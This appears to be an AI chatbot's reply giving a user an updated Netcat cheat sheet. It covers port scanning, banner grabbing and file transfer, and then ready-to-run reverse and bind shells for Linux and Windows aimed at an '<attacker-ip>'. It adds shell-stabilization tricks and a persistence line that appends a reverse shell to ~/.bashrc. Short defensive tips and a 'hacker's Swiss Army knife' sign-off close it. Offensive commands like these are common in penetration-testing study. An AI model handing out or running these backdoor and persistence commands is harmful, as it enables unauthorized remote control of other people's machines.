You're right! Below is the **updated Netcat Cheat Sheet** with **interactive shell stabilization** for Linux and Windows.

---

# **Netcat (nc) Cheat Sheet**

Netcat (`nc`) is a powerful networking tool used for reading, writing, and redirecting data over TCP/UDP connections. It can act as a **port scanner, file transfer tool, reverse shell, and even a backdoor**.

---

## **Installation**

🔹 **Linux**

```bash
sudo apt install netcat   # Debian/Ubuntu  
sudo yum install nc       # CentOS/RHEL  
sudo pacman -S netcat     # Arch  
```

🔹 **Windows**  
Use **ncat**, a Netcat alternative bundled with **Nmap**:  
[Download Nmap](https://nmap.org/download.html)

---

## **Basic Usage**

### **1️⃣ Simple Chat Between Two Machines**

🔹 **Listener (Server)**

```bash
nc -lvp 1234
```

🔹 **Client (Connect to Server)**

```bash
nc <server-ip> 1234
```

✔ Now, type messages between machines like a chat!

---

## **Port Scanning**

### **2️⃣ Scan Open Ports on a Target Machine**

🔹 **Linux**

```bash
nc -zv <target-ip> 20-1000
```

🔹 **Windows (ncat)**

```powershell
ncat -zv <target-ip> 20-1000
```

✔ Scans ports **20-1000** and shows open ones.

---

## **Banner Grabbing**

### **3️⃣ Get Service Information of an Open Port**

```bash
nc <target-ip> 80
```

✔ Type `HEAD / HTTP/1.1` and press Enter twice to fetch the HTTP banner.

---

## **File Transfer with Netcat**

### **4️⃣ Send & Receive Files Between Machines**

🔹 **On Sender Machine**

```bash
nc -lvnp 1234 < file.txt
```

🔹 **On Receiver Machine**

```bash
nc <sender-ip> 1234 > file.txt
```

✔ Works for any file type.

---

## **Reverse Shell (Backdoor Access)**

### **5️⃣ Start a Reverse Shell (Linux)**

🔹 **Victim Machine (Send Shell to Attacker)**

```bash
nc -e /bin/bash <attacker-ip> 4444
```

🔹 **Attacker Machine (Listen for Connection)**

```bash
nc -lvp 4444
```

✔ The attacker gains a shell on the victim’s machine.

---

## **Bind Shell (Attacker Connects Anytime)**

### **6️⃣ Persistent Backdoor (Linux)**

🔹 **Victim Machine (Always Listening)**

```bash
nc -lvnp 4444 -e /bin/bash
```

🔹 **Attacker Connects Anytime**

```bash
nc <victim-ip> 4444
```

✔ The attacker can connect anytime the port is open.

---

## **Windows Reverse Shell (Backdoor)**

### **7️⃣ Windows Reverse Shell (cmd.exe)**

🔹 **Victim Windows Machine**

```powershell
ncat.exe -e cmd.exe <attacker-ip> 4444
```

🔹 **Attacker Machine**

```bash
nc -lvp 4444
```

✔ Gives full Windows **cmd.exe** shell to the attacker.

---

## **Stabilizing a Reverse Shell**

Reverse shells often break or don’t support interactive commands. Use the following tricks to make them stable.

### **8️⃣ Stabilize a Linux Shell**

✔ **Upgrade a basic shell to an interactive TTY shell:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

✔ **Make backgrounding possible:**

```bash
CTRL + Z   # Background netcat shell
stty raw -echo
fg
```

✔ **Enable tab completion & command history:**

```bash
export TERM=xterm
```

✔ **Use a fully interactive shell:**

```bash
script /dev/null -c bash
```

---

## **Proxy & Port Forwarding**

### **9️⃣ Simple TCP Port Forwarding**

```bash
nc -lvp 8080 | nc <target-ip> 80
```

✔ Forwards connections from port 8080 to port 80.

---

## **Encrypt Communication with OpenSSL**

### **🔟 Secure Data Transfer with OpenSSL & Netcat**

🔹 **On Receiver Machine (Decrypt & Listen)**

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
openssl s_server -quiet -key key.pem -cert cert.pem -port 4433
```

🔹 **On Sender Machine (Encrypt & Send Data)**

```bash
nc <receiver-ip> 4433 | openssl s_client -quiet -connect <receiver-ip>:4433
```

✔ Encrypts communication using SSL/TLS.

---

## **Persistence & Automation**

### **1️⃣1️⃣ Add a Persistent Netcat Shell (Linux)**

```bash
echo "nc -e /bin/bash <attacker-ip> 4444" >> ~/.bashrc
```

✔ Runs every time the user logs in.

---

## **Defensive Measures (Prevent Netcat Attacks)**

✅ Use **firewalls** to block unnecessary open ports.  
✅ Disable **nc.exe or ncat** on Windows unless needed.  
✅ Use **IDS/IPS** to monitor suspicious connections.  
✅ Implement **strict access controls** on servers.

---

## **Netcat Alternatives**

🔹 **socat** – More secure with encryption and advanced features.  
🔹 **ncat** – Netcat’s official successor (bundled with Nmap).  
🔹 **cryptcat** – A version of Netcat with built-in encryption.

---

### 🚀 **Netcat is a hacker’s Swiss Army knife! Use it wisely!** 😈💻

Now with **interactive shell stabilization!** Let me know if you need more! 🚀